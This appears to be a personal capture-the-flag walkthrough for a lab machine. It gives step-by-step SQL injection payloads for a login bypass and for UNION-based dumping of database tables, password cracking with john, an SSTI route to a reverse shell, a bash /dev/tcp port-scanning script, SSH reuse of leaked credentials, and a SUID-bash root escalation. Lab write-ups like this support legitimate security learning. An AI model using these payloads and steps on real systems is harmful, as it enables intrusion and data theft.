1. Enumerate ports

2. Obtain information about the page hosted in that IP with the command whatweb

3. Try to enumerate more info with the Nmap script http-enum

4. Once you've tried to enumerate everything in the web-app you can now try to do somethings in the page itself

5. The first thing you can try is to do an SQL injection in the login page by sending a normal email and intercept the request in order to change the normal email into an SQL query like this: hello@hello.com' or 1=1 -- -

6. This sends you to the admin control page but it requests you a password in order to enter the flask management panel

7. Once you've exploited the login this way you can try another way by adding " ' order by 4-- -" or other numbers until you hit the maximum number of columns

8. Now you can try to insert numbers by adding ' union select 1, 2, 3, 4 

9. You'll see that the number 4 reflects in the server response, so, you can now try to exploit it via a [SSTI - Server Side Template Injection](</General Info/Tecnologias Web/Ataques/SSTI - Server Side Template Injection.md>) attack

10. As a PoC send something like ' union select 1, 2, 3, {{7\*7}}-- -

11. Because this didn't work out as expected now you can try a common SQL injection enumeration like:
	`' union select 1, 2, 3, table_name from information_schema.tables-- -` - List all tables from all DBs
	`' union select 1, 2, 3, schema_name from information_schema.schemata-- -` - List all DBs
	`' union select 1, 2, 3, table_name from information_schema.tables where table_schema = "main"-- -` - List all tables from the main DB
	`' union select 1, 2, 3, column_name from information_schema.columns where table_schema = "main" and table_name = "user"-- -` - List all the columns from the main DB and the user table
	`' union select 1, 2, 3, {name or id or password or email} from user where {name or id or password or email} = {"admin" or 1}-- -` - List all the content of the user table 1 by 1
	`' union select 1, 2, 3, group_concat(id,":",name,":",password,":", email) from user where {search criteria}-- -` - List all the content of the user table one user per line

12. Once you've obtained the password hashed you can try to identify it with hash-identifier and try to crack it

13. The way to crack it is by running the following command: john --wordlist=__{WORDLIST}__ hash --format=Raw-MD5

14. Now that you've got the password you can finally enter the flask admin panel

15. Going into the page you will come across the used edit panel that has the interesting name parameter that is susceptible to a SSTI attack

16. Try to run the attack to gain remote code execution, and eventually a reverse shell, listed in [SSTI - Server Side Template Injection](</General Info/Tecnologias Web/Ataques/SSTI - Server Side Template Injection.md>).

17. Now that you've a reverse-shell you can see if you're already in the victim's machine by using the command "hostname -I"

18. Now that we know we are in a container we can try to list interesting IPs with `route -n` 

19. Because there is an IP that ends with 1 we have to hack it to enter in the original user machine

20. Use `mount` to see all the mounts in docker and figure out that the directory that contains the flag is, indeed, a mount from the user's machine to the home directory

21. In this machine particularly you can see with `mount | grep home` that the /dev/sda1 is being mounted in /home/augustus

22. One of the last steps is to write a script to enumerate all the open ports in the victim's original machine by creating an script that does the same job as nmap:

```
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[-] Exiting...\n"
        tput cnorm; exit 1
}

trap ctrl_c INT

tput civis
for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Port $port open" &
done;wait
tput cnorm
```

>Basic explanation of the script above:
>
function ctrl_c : Is the function called if the program detects an INT signal such as "Ctrl + C", basically what this function does is echo out a message, make the mouse reappear and exit with a 1 in the exit code. 1 in the exit code is unsuccessful and 0 successful
>
trap ctrl_c INT : tell the app that when it recieves an INT signal execute the specified function
>
tput civis and tput cnorm : This command are basically to tell the app to disappear and appear the mouse respectively
>
for port in $(seq 1 65535); do : This part of the script tells the app to make the port variable have the the value 1, 2, 3, etc..
>
timeout 1 : Tells the app to kill the process if its duration is more than 1 second
>
bash -c "__{COMMAND}__" : Makes the bash shell execute the following command
>
echo ' ' > /dev/tcp/{IP}/$port : Sends an empty string to the machine in the ip specified and in the port that the port variable has that cycle
>
2>/dev/null : Tells the app to redirect all the error messages to /dev/null
>
&& echo "\[+] Port $port open" & : Makes the script only run the message if the exit code of the echo is 0. The final & makes the app use multiple threads to run the process of discovering ports
>
done; wait : done is to tell the app to finish the for iteration and wait is to make the app wait till the end of all the active threads

23. Now that we've created the shell file we can run the following command to make the shell convert the file into base64 and copy it into the clipboard to later on paste it in the victim's machine. The console command is explained in [Pass files easily from one shell to other](</General Info/Shell/Pass files easily from one shell to other.md>).

24. We've seen that the port 22 is open, so, because we've some credentials we can try to enter in the SSH service of the main machine with the user leaked in the mount "augustus" with the following command: `ssh augustus@172.19.0.1` and try the password "superadministrator" later on

25. We've gained access so we now can list all the machine to see if we're finally on the machine with the following commands `hostname -I` and `ip a`. See [Things to enumerate (Machine)](</General Info/Enumeration/Things to enumerate (Machine).md>)

26. After trying a lot of things the way to escalate privileges is to copy the bash to /home/augustus and, from the mount, give that file SUID permissions and make it root property with `chown root:root bash` and `chmod 4755 bash`, enter augustus profile again and run `./bash -p`